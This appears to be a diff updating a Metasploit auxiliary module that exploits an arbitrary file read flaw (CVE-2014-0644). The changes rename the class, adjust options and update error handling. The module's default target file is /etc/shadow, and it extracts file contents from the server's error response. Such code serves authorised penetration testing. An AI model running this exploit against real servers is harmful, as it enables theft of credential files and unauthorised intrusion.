@@ -1,13 +1,9 @@
-# This module requires Metasploit: http://metasploit.com/download
 ##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -25,6 +21,7 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'References'     =>
         [
+          ['CVE', '2014-0644'],
           ['EDB', '32623']
         ],
       'DisclosureDate' => 'Mar 31 2014'
@@ -34,10 +31,10 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptBool.new('SSL', [true, 'Use SSL', true]),
-        OptString.new('SSLVersion', [true, 'SSL version', 'TLS1']),
         OptString.new('TARGETURI', [ true, "Base directory path", '/']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
-      ], self.class)
+      ]
+    )
   end
 
   def run
@@ -63,13 +60,13 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if !res or !res.body
-      fail_with("Server did not respond in an expected way")
+      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way")
     end
 
     file = /For input string: "(.*)"/m.match(res.body)
 
     if !file or file.length < 2
-      fail_with("File was unretrievable. Was it a binary file?")
+      fail_with(Failure::UnexpectedReply, "File was unretrievable. Was it a binary file?")
     end
 
     file = file[1]
@@ -79,4 +76,3 @@ class Metasploit3 < Msf::Auxiliary
     print_good("File saved to: " + path)
   end
 end
-
